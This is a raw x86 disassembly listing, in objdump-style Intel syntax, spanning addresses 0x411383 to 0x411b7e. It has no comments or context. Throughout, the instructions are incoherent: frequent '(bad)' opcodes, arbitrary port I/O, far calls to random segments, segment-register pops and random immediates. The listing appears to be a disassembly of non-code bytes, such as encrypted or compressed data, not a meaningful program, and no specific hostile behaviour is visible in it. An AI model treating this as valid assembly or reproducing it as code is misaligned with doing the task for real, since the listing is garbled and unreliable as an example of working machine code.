  411383:	sub    ch,ch
  411385:	pop    ecx
  411386:	in     eax,dx
  411387:	and    DWORD PTR [edx+0xc7f9887],ebp
  41138d:	in     al,0x6c
  41138f:	fs sub al,0xc6
  411392:	xor    al,0x8e
  411394:	scas   al,BYTE PTR es:[edi]
  411395:	mov    bl,0xd5
  411397:	adc    eax,0xdb46d199
  41139c:	mov    al,0x74
  41139e:	je     0x41140e
  4113a0:	call   0x8b3c194b
  4113a5:	add    ah,BYTE PTR [edi-0x40afb660]
  4113ab:	test   BYTE PTR ds:0x133fb60a,0x14
  4113b2:	pop    ds
  4113b3:	inc    esp
  4113b4:	xlat   BYTE PTR ds:[ebx]
  4113b5:	clc    
  4113b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113b7:	ret    0xddce
  4113ba:	add    BYTE PTR [ecx-0x45c21135],cl
  4113c0:	and    al,0xe0
  4113c2:	dec    ecx
  4113c3:	mov    dl,0xba
  4113c5:	cmp    DWORD PTR ds:0x7e22718e,ecx
  4113cb:	sbb    BYTE PTR ds:0xae17fc35,cl
  4113d1:	mov    eax,ds:0x6e5600ce
  4113d6:	add    al,0xe8
  4113d8:	push   edi
  4113d9:	xchg   esp,eax
  4113da:	jae    0x41144a
  4113dc:	mov    bh,0xd6
  4113de:	repz (bad) 
  4113e0:	xchg   ecx,eax
  4113e1:	sbb    eax,0x2e77795
  4113e6:	dec    ecx
  4113e7:	aaa    
  4113e8:	pusha  
  4113e9:	add    DWORD PTR [ecx-0x16],edi
  4113ec:	cmp    BYTE PTR [edx-0x3184d8c4],cl
  4113f2:	sbb    cl,dh
  4113f4:	inc    eax
  4113f5:	mov    al,0xe1
  4113f7:	push   0xffffffd4
  4113f9:	stos   DWORD PTR es:[edi],eax
  4113fa:	mov    ds:0x39f36d27,al
  4113ff:	push   ds
  411400:	inc    esi
  411401:	and    eax,DWORD PTR [esi+ecx*4]
  411404:	sub    eax,edx
  411406:	pop    ss
  411407:	cwde   
  411408:	push   0x77
  41140a:	sbb    eax,0xf195a0da
  41140f:	into   
  411410:	arpl   WORD PTR [ecx+0x6fac609f],bp
  411416:	icebp  
  411417:	sbb    bh,BYTE PTR [ebx+0x47126d9e]
  41141d:	push   ebx
  41141e:	out    0x7a,eax
  411420:	loope  0x411481
  411422:	rol    ebx,0x16
  411425:	ins    BYTE PTR es:[edi],dx
  411426:	ret    0x9c24
  411429:	or     eax,0x9c3a6868
  41142e:	dec    eax
  41142f:	inc    esp
  411430:	(bad)
  411434:	push   0x9c70d93f
  411439:	xchg   esi,eax
  41143a:	push   0x75a46f46
  41143f:	das    
  411440:	jl     0x4113cc
  411442:	push   ecx
  411443:	mov    ah,0x84
  411445:	fcom   DWORD PTR [edx+0x50d0986d]
  41144b:	data16 xchg BYTE PTR [eax],ah
  41144e:	jne    0x41145c
  411450:	popa   
  411451:	xor    DWORD PTR [ecx+0x44],0x12
  411455:	mov    ch,0x9b
  411457:	aad    0xde
  411459:	je     0x411497
  41145b:	fdivp  st(6),st
  41145d:	xor    al,BYTE PTR [esp+esi*1+0x32]
  411461:	outs   dx,DWORD PTR ds:[esi]
  411463:	jno    0x41145b
  411465:	shr    ecx,0xbd
  411468:	fst    QWORD PTR [ecx+edx*2+0x7d9f93a0]
  41146f:	setae  dl
  411472:	out    dx,eax
  411473:	mov    esp,0xadb4bcb8
  411478:	pop    edi
  411479:	repnz pop ds
  41147b:	pushf  
  41147c:	xchg   ecx,eax
  41147d:	push   edi
  41147e:	xchg   DWORD PTR [edx-0xc],esi
  411481:	dec    ebp
  411482:	loope  0x411430
  411484:	xchg   ebx,eax
  411485:	push   0x8f829b54
  41148a:	mov    dh,0x41
  41148c:	inc    ebp
  41148d:	shl    BYTE PTR [eax],cl
  41148f:	pop    ds
  411490:	or     al,0x91
  411492:	sbb    dl,dh
  411494:	jp     0x411457
  411496:	jne    0x41148d
  411498:	and    esi,DWORD PTR [esi+0x4eefd6dc]
  41149e:	sub    bl,BYTE PTR [eax]
  4114a0:	loop   0x411448
  4114a2:	mov    bl,0x44
  4114a4:	dec    edx
  4114a5:	int    0x11
  4114a7:	mov    ecx,0xf7538be8
  4114ac:	adc    BYTE PTR [ebx+0x36391642],dl
  4114b2:	in     eax,0xa3
  4114b4:	mov    dh,0x1
  4114b6:	enter  0xa3f4,0xfa
  4114ba:	out    0x36,al
  4114bc:	(bad)  
  4114bd:	mov    ds:0xb4ea993b,al
  4114c2:	pop    edx
  4114c3:	push   ss
  4114c4:	add    eax,eax
  4114c6:	dec    edx
  4114c7:	ins    BYTE PTR es:[edi],dx
  4114c8:	cs adc eax,0x70e7847d
  4114ce:	push   esp
  4114cf:	push   edi
  4114d0:	adc    BYTE PTR [eax+0x48],0xc4
  4114d4:	dec    eax
  4114d5:	xchg   ebx,eax
  4114d6:	nop    DWORD PTR [edi*8-0x1e47da94]
  4114de:	xchg   ebx,eax
  4114df:	jg     0x41148e
  4114e1:	jp     0x411470
  4114e3:	jmp    0x4bf78075
  4114e8:	test   DWORD PTR [esi+0x13219b0c],0x59cd2296
  4114f2:	in     eax,dx
  4114f3:	adc    bl,BYTE PTR [edi-0xc780510]
  4114f9:	popf   
  4114fa:	lods   al,BYTE PTR ds:[esi]
  4114fb:	(bad)  
  4114fd:	inc    esi
  4114ff:	mov    BYTE PTR [esi+edi*4-0x6fad7298],bh
  411506:	aam    0xbe
  411508:	int3   
  411509:	inc    edi
  41150a:	add    ecx,ebp
  41150c:	cs mov ch,0xf6
  41150f:	and    DWORD PTR [eax+0x6b],ecx
  411512:	mov    BYTE PTR [eiz*2-0x710e9915],cl
  411519:	aas    
  41151a:	fs pop ss
  41151c:	(bad)  
  41151d:	retf   0x6aba
  411520:	ret    0xf9b2
  411523:	outs   dx,BYTE PTR ds:[esi]
  411524:	pop    ecx
  411525:	or     eax,0xcbd79a11
  41152a:	(bad)
  41152f:	(bad)  
  411530:	in     eax,dx
  411531:	aaa    
  411532:	sub    esi,ebp
  411534:	and    DWORD PTR [eax+0x46677ed8],edi
  41153a:	pop    esi
  41153b:	js     0x4114d8
  41153d:	outs   dx,BYTE PTR ds:[esi]
  41153e:	mov    ds:0x30b88d6a,eax
  411543:	push   esp
  411544:	add    eax,0x1af6ce14
  411549:	and    ebp,ebx
  41154b:	inc    esi
  41154c:	addr16 push sp
  41154f:	scas   al,BYTE PTR es:[edi]
  411550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411551:	call   0x32f:0x7d04632b
  411558:	inc    esp
  411559:	arpl   WORD PTR [ebp-0x56],cx
  41155c:	push   ebp
  41155d:	leave  
  41155e:	cdq    
  41155f:	mov    bh,0xb7
  411561:	cs mov ecx,0x87c3d36f
  411567:	add    al,0xad
  411569:	add    ah,BYTE PTR [edi-0x52]
  41156c:	jmp    edi
  41156e:	pusha  
  41156f:	and    esi,DWORD PTR [eax+0x582a4f9d]
  411575:	mov    ds:0x4c5cf68e,eax
  41157a:	inc    esi
  41157b:	mov    bh,0xbe
  41157d:	jecxz  0x4115db
  41157f:	(bad)  [edx]
  411581:	sbb    al,0x2e
  411583:	mov    bh,0xf5
  411585:	retf   0x3f4e
  411588:	dec    esp
  411589:	pop    edx
  41158a:	dec    esp
  41158b:	ror    BYTE PTR [esp+ebp*4-0x35aaa125],cl
  411592:	or     BYTE PTR [ebx-0x56],al
  411595:	cdq    
  411596:	xchg   esp,eax
  411597:	pop    es
  411598:	jmp    0x17e8:0x133c3931
  41159f:	in     eax,0xc4
  4115a1:	aas    
  4115a2:	mov    dh,BYTE PTR [eax+0x4f]
  4115a5:	pop    ebx
  4115a6:	fwait
  4115a7:	mov    BYTE PTR [ecx+edx*1+0x3e],ah
  4115ab:	cmp    BYTE PTR [ecx],0x45
  4115ae:	inc    ecx
  4115af:	mov    DWORD PTR ds:0x226fd365,edi
  4115b5:	xchg   edi,eax
  4115b6:	fcomp  QWORD PTR [ebx+0x1f634dcc]
  4115bc:	sub    DWORD PTR ds:[edi],ecx
  4115bf:	jmp    0x3fecb27b
  4115c4:	sar    DWORD PTR [ebx-0x54],0x38
  4115c8:	in     al,0x96
  4115ca:	std    
  4115cb:	add    bl,cl
  4115cd:	out    0x3f,eax
  4115cf:	leave  
  4115d0:	fsubrp st(6),st
  4115d2:	aam    0xbf
  4115d4:	fsubr  DWORD PTR [eax+esi*1-0x686556a4]
  4115db:	call   0xbe7f5731
  4115e0:	jl     0x4115c0
  4115e2:	add    edx,eax
  4115e4:	dec    eax
  4115e5:	data16 cmp al,0x6e
  4115e8:	stos   DWORD PTR es:[edi],eax
  4115e9:	retf   0x32b6
  4115ec:	cwde   
  4115ed:	xor    al,0xa8
  4115ef:	out    dx,eax
  4115f0:	cmp    eax,0xf988a298
  4115f5:	or     dh,BYTE PTR [ecx]
  4115f7:	pushf  
  4115f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115f9:	rcr    BYTE PTR [esi+0x40f9468a],cl
  4115ff:	inc    ebp
  411600:	push   0x674aac7d
  411605:	and    BYTE PTR [ecx+0x20a98102],bh
  41160b:	out    dx,al
  41160c:	mov    eax,ds:0x1b7a3665
  411611:	test   eax,0x8e1d59d9
  411616:	jp     0x4115bd
  411618:	ss xor eax,0x2f9a9bdc
  41161e:	xchg   edi,eax
  41161f:	(bad)  
  411620:	mov    dl,0x8e
  411622:	jmp    0xf83a23e
  411627:	jmp    0x2efe:0x5ba53820
  41162e:	(bad)  
  41162f:	cmp    dh,BYTE PTR [esi]
  411631:	lods   eax,DWORD PTR ds:[esi]
  411632:	ficom  WORD PTR [eax-0x1d]
  411635:	lea    edx,[esi]
  411637:	neg    ecx
  411639:	jnp    0x4116af
  41163b:	not    edi
  41163d:	xor    eax,0x786ca84d
  411642:	inc    esp
  411643:	jmp    0xfb16:0x69a658f
  41164a:	mov    dh,0xc2
  41164c:	add    al,0x46
  41164e:	xchg   ebx,eax
  41164f:	ror    ecx,cl
  411651:	push   eax
  411652:	psubusb mm7,mm3
  411655:	sbb    eax,0x54464f92
  41165a:	pusha  
  41165b:	push   cs
  41165c:	pop    ebx
  41165d:	adc    bh,ch
  41165f:	add    cl,BYTE PTR [edi]
  411661:	idiv   dl
  411663:	push   cs
  411664:	stc    
  411665:	shl    DWORD PTR [esp+ebp*8-0x3f],0xa3
  41166a:	pushf  
  41166b:	arpl   WORD PTR [ecx+edi*4-0x36],cx
  41166f:	pusha  
  411670:	sti    
  411671:	or     edi,ebp
  411673:	and    eax,0xfa8ac56c
  411678:	loope  0x41166d
  41167a:	test   BYTE PTR [esi],bl
  41167c:	or     eax,0xe742b24e
  411681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411682:	(bad)  
  411683:	sub    eax,0xffffffdc
  411686:	icebp  
  411687:	shr    esp,cl
  411689:	and    DWORD PTR [edi-0x3a],eax
  41168c:	add    ch,BYTE PTR [edx+edx*4-0x589cfc71]
  411693:	mov    dl,0x41
  411695:	inc    edx
  411696:	xchg   BYTE PTR [edx],bh
  411698:	push   0x1204b97d
  41169d:	jnp    0x41169b
  41169f:	or     DWORD PTR [esi*8-0x48236412],esi
  4116a6:	jmp    0x576c540
  4116ab:	lea    esp,[esp+ebp*8+0x78]
  4116af:	or     al,0x83
  4116b1:	outs   dx,DWORD PTR ds:[esi]
  4116b2:	jp     0x4116e6
  4116b4:	inc    edx
  4116b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b6:	add    dl,BYTE PTR [ebx]
  4116b8:	sub    DWORD PTR [edi],edx
  4116ba:	shl    BYTE PTR [ecx-0x493b1420],0xb4
  4116c1:	aas    
  4116c2:	or     BYTE PTR [ebx-0x692aa4f9],0xb8
  4116c9:	pop    es
  4116ca:	mov    eax,0x777fdcdf
  4116cf:	xor    dh,0x4a
  4116d2:	scas   eax,DWORD PTR es:[edi]
  4116d3:	pop    ds
  4116d4:	xchg   eax,esp
  4116d6:	jo     0x411697
  4116d8:	push   cs
  4116d9:	ret    0x2606
  4116dc:	xor    ch,dh
  4116de:	je     0x411735
  4116e0:	pop    esi
  4116e1:	push   esp
  4116e2:	gs lahf 
  4116e4:	adc    BYTE PTR [edi+0x1917ce68],cl
  4116ea:	adc    DWORD PTR [esi],esi
  4116ec:	xchg   ebp,eax
  4116ed:	jno    0x4116a2
  4116ef:	dec    ebp
  4116f0:	sub    DWORD PTR [edx+0x4c],0x93fefa51
  4116f7:	adc    bh,ch
  4116f9:	mov    bl,0x82
  4116fb:	pusha  
  4116fc:	push   ecx
  4116fd:	push   edi
  4116fe:	lock cs or bh,ch
  411702:	fild   DWORD PTR [ecx+0x44]
  411705:	add    esi,DWORD PTR [esi]
  411707:	jae    0x411777
  411709:	cmp    DWORD PTR [ebp+0x70],ecx
  41170c:	adc    dl,ch
  41170e:	sbb    DWORD PTR [ebx-0x1774183b],ebp
  411714:	pop    ebx
  411715:	add    BYTE PTR [edx-0x3c608dc8],bh
  41171b:	or     eax,0x67b55458
  411720:	mov    bh,0x84
  411722:	pop    ss
  411723:	adc    eax,0x14e530e6
  411728:	xor    DWORD PTR [edi+0x38],esp
  41172b:	addr16 aad 0x7c
  41172e:	pop    esp
  41172f:	xchg   DWORD PTR [esi-0x5c1d5798],ebx
  411735:	mov    ebp,0x6cf0ef47
  41173a:	inc    edx
  41173b:	enter  0x9a8e,0x14
  41173f:	cli    
  411740:	push   0xcb7a4035
  411745:	push   esp
  411746:	mov    ds:0x727ffc07,al
  41174b:	pop    ebp
  41174c:	pop    edi
  41174d:	lods   eax,DWORD PTR ds:[esi]
  41174e:	sbb    al,0xa0
  411750:	mov    cl,0x68
  411752:	rcr    BYTE PTR [edx+0x0],cl
  411755:	push   cs
  411756:	add    al,0x67
  411758:	inc    edx
  411759:	(bad)  
  41175a:	fcmovb st,st(0)
  41175c:	out    dx,al
  41175d:	mov    eax,0xa6e26f7
  411762:	outs   dx,BYTE PTR ds:[esi]
  411763:	scas   eax,DWORD PTR es:[edi]
  411764:	cmp    esp,esp
  411766:	fnstcw WORD PTR [edi+0x3f0832f3]
  41176c:	fldcw  WORD PTR [ebp-0x1e9c5a4a]
  411772:	hlt    
  411773:	push   eax
  411774:	pop    es
  411775:	sti    
  411776:	pop    ss
  411777:	test   bh,cl
  411779:	sbb    eax,0x8b501b4a
  41177e:	cmp    BYTE PTR [edx-0x1e],dl
  411781:	or     esi,edx
  411783:	icebp  
  411784:	ret    
  411785:	arpl   bx,bx
  411787:	dec    ebp
  411788:	cld    
  411789:	in     eax,0xa0
  41178b:	xchg   ebp,eax
  41178c:	loop   0x411743
  41178e:	(bad)  
  41178f:	scas   eax,DWORD PTR es:[edi]
  411790:	sub    eax,DWORD PTR [esi+ebx*2+0x1f]
  411794:	inc    ebx
  411795:	rcl    esi,cl
  411797:	mov    ebx,0x3f67c463
  41179c:	and    edi,DWORD PTR ds:[ecx]
  41179f:	into   
  4117a0:	sub    ch,0xda
  4117a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117a4:	sbb    ebp,esi
  4117a6:	push   0xb16f7c87
  4117ab:	pop    ss
  4117ac:	inc    eax
  4117ad:	and    eax,0x6b626eb2
  4117b2:	xlat   BYTE PTR ds:[ebx]
  4117b3:	(bad)
  4117b6:	jecxz  0x411788
  4117b8:	sar    DWORD PTR ds:[ebx-0x63],cl
  4117bc:	mov    DWORD PTR [eax],esp
  4117be:	xor    eax,0x82b9a1b8
  4117c3:	into   
  4117c4:	dec    ebp
  4117c5:	leave  
  4117c6:	loop   0x411808
  4117c8:	push   esi
  4117c9:	ret    0x1938
  4117cc:	pop    esi
  4117cd:	test   eax,0x3f272b27
  4117d2:	dec    esp
  4117d3:	(bad)  
  4117d4:	pushf  
  4117d5:	imul   edx,DWORD PTR [ebx-0x12],0x0
  4117d9:	inc    eax
  4117da:	out    dx,al
  4117db:	mov    esp,0xc28c3f34
  4117e0:	push   0x6b
  4117e2:	ret    
  4117e3:	jp     0x4117fc
  4117e5:	scas   al,BYTE PTR es:[edi]
  4117e6:	frstor [edi+0x6d2cdbec]
  4117ec:	mul    DWORD PTR [ecx]
  4117ee:	ror    BYTE PTR ds:[ebp*2+0x3bdc6b0d],0x22
  4117f7:	mov    bl,0x68
  4117f9:	adc    eax,DWORD PTR [ebp+ecx*4-0x21]
  4117fd:	daa    
  4117fe:	inc    edx
  4117ff:	dec    esp
  411800:	pop    es
  411801:	call   0x3e34:0x644b6fa9
  411808:	je     0x41181f
  41180a:	mov    eax,ds:0xe2e1090
  41180f:	aas    
  411810:	or     eax,0xabef56
  411815:	mov    edx,0x70faf6dc
  41181a:	in     al,0x5f
  41181c:	xor    BYTE PTR [ebp+0x9194302],ah
  411822:	(bad)  
  411823:	or     eax,0x893196f1
  411828:	(bad)  
  41182a:	out    0x97,al
  41182c:	ss mov bh,0x18
  41182f:	outs   dx,BYTE PTR ds:[esi]
  411830:	test   BYTE PTR [ecx],ch
  411832:	adc    ebx,ebx
  411834:	inc    esi
  411835:	fstp   DWORD PTR [edx+0x3a]
  411838:	das    
  411839:	xchg   ebx,eax
  41183a:	mov    cl,0x9a
  41183c:	xor    DWORD PTR [ecx-0x5e],0x96a1fced
  411843:	shl    ebx,1
  411845:	out    dx,al
  411846:	push   ebx
  411848:	stc    
  411849:	je     0x411801
  41184b:	push   edi
  41184c:	xor    edx,DWORD PTR [edx]
  41184e:	js     0x411833
  411850:	loop   0x411866
  411852:	push   edi
  411853:	xor    eax,0x66ce309a
  411858:	push   ebp
  411859:	pop    ebx
  41185a:	push   ds
  41185b:	shr    BYTE PTR [ecx+0x6d],cl
  41185e:	rol    DWORD PTR [esp+edi*1+0x11],1
  411862:	imul   edx,DWORD PTR [ecx+ebx*2+0x6ddc1c05],0xf3266044
  41186d:	(bad)  
  41186e:	loopne 0x411826
  411870:	add    al,0x74
  411872:	ins    BYTE PTR es:[edi],dx
  411873:	scas   eax,DWORD PTR es:[edi]
  411874:	pop    ds
  411875:	aas    
  411876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411877:	call   0xc82277f6
  41187c:	loope  0x411827
  41187e:	jge    0x4118af
  411880:	outs   dx,BYTE PTR ds:[esi]
  411881:	add    ch,BYTE PTR [edi]
  411883:	or     al,0xed
  411885:	fs jno 0x4118c7
  411888:	mov    edx,0x53318526
  41188d:	mov    edi,0x74066426
  411892:	dec    esi
  411893:	in     eax,0xb6
  411895:	jo     0x411904
  411897:	xor    BYTE PTR [esi-0x6120f141],al
  41189d:	adc    BYTE PTR [edi-0x6],0xe9
  4118a1:	and    al,0x9a
  4118a3:	jbe    0x411847
  4118a5:	rcl    DWORD PTR [esi],cl
  4118a7:	lahf   
  4118a8:	inc    ecx
  4118a9:	cli    
  4118aa:	int3   
  4118ab:	mov    ebx,DWORD PTR [edi]
  4118ad:	jg     0x4118db
  4118af:	push   eax
  4118b0:	shr    BYTE PTR [ecx],1
  4118b2:	adc    DWORD PTR [ecx],ecx
  4118b4:	hlt    
  4118b5:	bound  edx,QWORD PTR [edi+0x3ab31335]
  4118bb:	sub    eax,0x4ae89e9d
  4118c0:	and    ch,dh
  4118c2:	and    bl,bh
  4118c4:	js     0x411881
  4118c6:	int    0x21
  4118c8:	fs stos BYTE PTR es:[edi],al
  4118ca:	jne    0x41184e
  4118cc:	push   cs
  4118cd:	jne    0x41186e
  4118cf:	scas   al,BYTE PTR es:[edi]
  4118d0:	jecxz  0x4118f1
  4118d2:	xchg   esp,eax
  4118d3:	sub    BYTE PTR [edi+ecx*2],al
  4118d6:	out    0x54,eax
  4118d8:	dec    ecx
  4118d9:	in     al,0x20
  4118db:	stos   BYTE PTR es:[edi],al
  4118dc:	jo     0x41186e
  4118de:	icebp  
  4118df:	jg     0x4118d3
  4118e1:	stos   BYTE PTR es:[edi],al
  4118e2:	mov    al,0x34
  4118e4:	jp     0x411907
  4118e6:	cs data16 fsubrp st(5),st
  4118ea:	push   esp
  4118eb:	stos   DWORD PTR es:[edi],eax
  4118ec:	sub    BYTE PTR [edx-0x46],bl
  4118ef:	fmul   QWORD PTR [ecx+0x53cac087]
  4118f5:	fs and al,ah
  4118f8:	cmp    DWORD PTR [esi+0x43],eax
  4118fb:	rcl    cl,cl
  4118fd:	mov    edi,0xbbfabc88
  411902:	push   esi
  411903:	div    BYTE PTR ds:0xba6011f3
  411909:	inc    ebx
  41190a:	xchg   esi,eax
  41190b:	cdq    
  41190c:	or     al,0x16
  41190e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190f:	cdq    
  411910:	mov    al,0x41
  411912:	inc    esi
  411913:	sub    bh,BYTE PTR [eax]
  411915:	mov    dl,0x20
  411917:	cdq    
  411918:	cmp    BYTE PTR [ebx-0x4a91bae9],bh
  41191e:	pop    edx
  41191f:	push   edx
  411920:	and    ebx,ebp
  411922:	sahf   
  411923:	(bad)  
  411924:	out    dx,al
  411925:	int    0x7b
  411927:	jp     0x41196e
  411929:	mov    ds:0xc6d64fd2,al
  41192e:	dec    ebp
  41192f:	popf   
  411930:	mov    ch,0x26
  411932:	neg    al
  411934:	outs   dx,BYTE PTR ds:[esi]
  411935:	loop   0x411948
  411937:	enter  0x48ac,0x5f
  41193b:	or     eax,0xa798f353
  411940:	popf   
  411941:	aam    0x23
  411943:	adc    eax,ecx
  411945:	xor    eax,0x37d50f6a
  41194a:	rcr    DWORD PTR [ebx+edi*2-0x74],cl
  41194e:	push   esp
  41194f:	or     BYTE PTR [esp+ecx*2+0x36],bh
  411953:	xchg   esp,eax
  411954:	sti    
  411955:	fstp   DWORD PTR [ebp+0x52]
  411958:	xchg   esi,eax
  411959:	xor    DWORD PTR [eax],0xffffffe8
  41195c:	push   esi
  41195d:	xchg   edi,eax
  41195e:	scas   eax,DWORD PTR es:[edi]
  41195f:	outs   dx,BYTE PTR ds:[esi]
  411960:	sbb    DWORD PTR [esi],eax
  411962:	les    edi,FWORD PTR [edx-0x1c164f86]
  411968:	imul   eax,ebx,0x9b16062c
  41196e:	jns    0x411975
  411970:	iret   
  411971:	les    ebx,FWORD PTR [esi]
  411973:	dec    ecx
  411974:	outs   dx,DWORD PTR ds:[esi]
  411975:	dec    ebp
  411976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411977:	sbb    BYTE PTR [ecx+ebp*4-0x49487864],dh
  41197e:	fisttp WORD PTR [ebp-0x1e4ead3b]
  411984:	and    DWORD PTR [ebx-0x21],ecx
  411987:	test   eax,0x7ee83503
  41198c:	iret   
  41198d:	inc    edi
  41198e:	pushf  
  41198f:	lea    edx,[edx]
  411991:	jmp    0xfb97638d
  411996:	in     al,dx
  411997:	xor    eax,0x1f43e437
  41199c:	ret    0x320
  41199f:	test   al,0xf
  4119a1:	test   edi,ecx
  4119a3:	xor    BYTE PTR [esi+0x42e22c52],bl
  4119a9:	loopne 0x411a26
  4119ab:	aas    
  4119ac:	sbb    esp,DWORD PTR [edx-0x46916f94]
  4119b2:	mov    esp,0x24bfcacb
  4119b7:	jno    0x4119f7
  4119b9:	push   ds
  4119ba:	mov    dh,0xae
  4119bc:	(bad)  
  4119bd:	inc    eax
  4119be:	scas   eax,DWORD PTR es:[edi]
  4119bf:	es pop ebp
  4119c1:	inc    ebx
  4119c2:	in     eax,0xf8
  4119c4:	out    dx,al
  4119c5:	test   al,0xc4
  4119c7:	ficom  DWORD PTR [ecx+0xddd2809]
  4119cd:	cli    
  4119ce:	into   
  4119cf:	and    ebp,DWORD PTR [eax]
  4119d1:	jecxz  0x411990
  4119d3:	cli    
  4119d4:	scas   al,BYTE PTR es:[edi]
  4119d5:	pop    edx
  4119d6:	call   0xe68d:0x89d5ea1c
  4119dd:	(bad)  
  4119de:	out    dx,eax
  4119df:	test   DWORD PTR [esi],esp
  4119e1:	push   ds
  4119e2:	(bad)  
  4119e3:	mov    BYTE PTR [edx-0x6b4c922],0xe8
  4119ea:	inc    ebx
  4119eb:	aad    0x82
  4119ed:	sti    
  4119ee:	sbb    bh,BYTE PTR [eax+0xe116c94]
  4119f4:	jle    0x411988
  4119f6:	dec    eax
  4119f7:	dec    edi
  4119f8:	mov    dl,0x1d
  4119fa:	xchg   ebx,eax
  4119fb:	push   esp
  4119fc:	inc    edi
  4119fd:	mov    edi,0xe1981664
  411a02:	shl    al,1
  411a04:	rcl    BYTE PTR ds:0x47001240,cl
  411a0a:	test   BYTE PTR [ecx+edx*2-0x6b69f094],ah
  411a11:	inc    eax
  411a12:	out    0xc9,al
  411a14:	xor    bl,0xa
  411a17:	add    ecx,eax
  411a19:	ror    bh,cl
  411a1b:	out    0x7d,al
  411a1d:	jae    0x411a7e
  411a1f:	mov    ecx,0xd9552578
  411a24:	add    al,0x63
  411a26:	xlat   BYTE PTR ds:[ebx]
  411a27:	push   es
  411a28:	jmp    0x4119fa
  411a2a:	sub    al,0x5d
  411a2c:	into   
  411a2d:	jnp    0x411a6b
  411a2f:	jnp    0x411a31
  411a31:	cmp    eax,0x8895f9d0
  411a36:	in     al,0x43
  411a38:	test   BYTE PTR [edi-0x48],bl
  411a3b:	lods   eax,DWORD PTR ds:[esi]
  411a3c:	and    DWORD PTR [eax-0x78699720],esp
  411a42:	mov    dl,0xd2
  411a44:	xchg   edi,eax
  411a45:	xchg   esi,eax
  411a46:	mov    ch,0x8a
  411a48:	jae    0x411ab7
  411a4a:	mov    bl,0x86
  411a4c:	mov    al,BYTE PTR [edx+0x148f295a]
  411a52:	inc    ecx
  411a53:	mov    dl,BYTE PTR [edi+0x59]
  411a56:	mov    eax,ds:0x8e86cd97
  411a5b:	push   ss
  411a5c:	dec    esi
  411a5d:	and    DWORD PTR [ebp+0x7e],ebp
  411a60:	xchg   ebp,eax
  411a61:	inc    edx
  411a62:	rcr    BYTE PTR [ebx+ebx*4-0x25c36dac],0xec
  411a6a:	pop    ss
  411a6b:	repz mov cl,0x2d
  411a6e:	sub    BYTE PTR [ebx+0x26],0x3f
  411a72:	(bad)  
  411a73:	pop    ebx
  411a74:	in     al,0x92
  411a76:	pop    ss
  411a77:	lock push eax
  411a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a7b:	pop    ss
  411a7c:	sub    eax,DWORD PTR [edx]
  411a7e:	mov    eax,0x675580fa
  411a83:	mov    esp,0xd284e465
  411a88:	test   eax,0x40cad0fe
  411a8d:	and    BYTE PTR [eax+0x67],bh
  411a90:	cs into 
  411a92:	jno    0x411a35
  411a94:	pop    esi
  411a95:	cli    
  411a96:	mov    cs,esi
  411a98:	jl     0x411ad9
  411a9a:	test   BYTE PTR [edi-0x72],ah
  411a9d:	dec    esp
  411a9e:	call   0x6fb5:0x4e34d7d
  411aa5:	jb     0x411a55
  411aa7:	mov    eax,0x20420397
  411aac:	cli    
  411aad:	or     bh,dl
  411aaf:	cmp    DWORD PTR [eax+0x4ce653ac],ecx
  411ab5:	xchg   ecx,eax
  411ab6:	jno    0x411ac6
  411ab8:	cli    
  411ab9:	mov    bh,0x46
  411abb:	xchg   esp,eax
  411abc:	shr    DWORD PTR [eax-0x7f5e6148],0x98
  411ac3:	lods   al,BYTE PTR ds:[esi]
  411ac4:	frstor [ebx+0x5df98fd5]
  411aca:	pop    gs
  411acc:	sbb    DWORD PTR [esi],ebx
  411ace:	or     ah,BYTE PTR [edi+edx*8-0x5bb9c038]
  411ad5:	pop    eax
  411ad6:	call   0x9d73:0xd4c2b326
  411add:	sahf   
  411ade:	dec    eax
  411adf:	adc    al,0xff
  411ae1:	fdiv   st,st(0)
  411ae3:	xor    dh,BYTE PTR [edx+ebp*2+0x7c3cf1c5]
  411aea:	cwde   
  411aeb:	out    0xb9,eax
  411aed:	mov    esi,ebp
  411aef:	mov    edx,0x64feabad
  411af4:	or     al,0x34
  411af6:	push   ds
  411af7:	es inc eax
  411af9:	fnstenv [ecx+0x34]
  411afc:	sub    eax,0xca60b015
  411b01:	or     BYTE PTR [edx+ecx*8+0x76c9a794],dl
  411b08:	mov    eax,ds:0xb127abc3
  411b0d:	dec    ebp
  411b0e:	mov    BYTE PTR [edi],dh
  411b10:	lock xor cl,BYTE PTR ds:0xae8ee64d
  411b17:	add    cl,dh
  411b19:	pop    ds
  411b1a:	xchg   edi,eax
  411b1b:	and    DWORD PTR [esp+ecx*8-0xf],ebx
  411b1f:	popa   
  411b20:	cmovne esi,DWORD PTR [ebp-0x6a]
  411b24:	ds aas 
  411b26:	add    eax,ebp
  411b28:	xchg   esp,eax
  411b29:	xor    BYTE PTR [ebp+0x746dddb1],ch
  411b2f:	xchg   esi,eax
  411b30:	sbb    ecx,DWORD PTR [edx]
  411b32:	shl    edx,1
  411b34:	cmp    BYTE PTR [ebx-0x45],0x82
  411b38:	retf   0xaf82
  411b3b:	push   edx
  411b3c:	repnz or eax,0xd7cf92f8
  411b42:	mov    esi,0xb073533d
  411b47:	xor    eax,0x178bae19
  411b4c:	(bad)  
  411b4d:	dec    ebx
  411b4e:	mov    al,0x70
  411b50:	adc    DWORD PTR [eax-0x3e5c749f],esp
  411b56:	push   ebx
  411b57:	arpl   WORD PTR [ecx+ecx*4+0x29],ax
  411b5b:	push   0xd64070da
  411b60:	es lahf 
  411b62:	loopne 0x411bd6
  411b64:	int    0x6
  411b66:	push   eax
  411b67:	frstor [ebx-0x3aa5cb11]
  411b6d:	add    DWORD PTR [edx],ebx
  411b6f:	push   eax
  411b70:	pop    ebp
  411b71:	ins    DWORD PTR es:[edi],dx
  411b72:	cmp    eax,0x585f63b3
  411b77:	retf   0x1aef
  411b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b7b:	push   esi
  411b7c:	sahf   
  411b7d:	in     eax,dx
  411b7e:	xchg   edx,eax
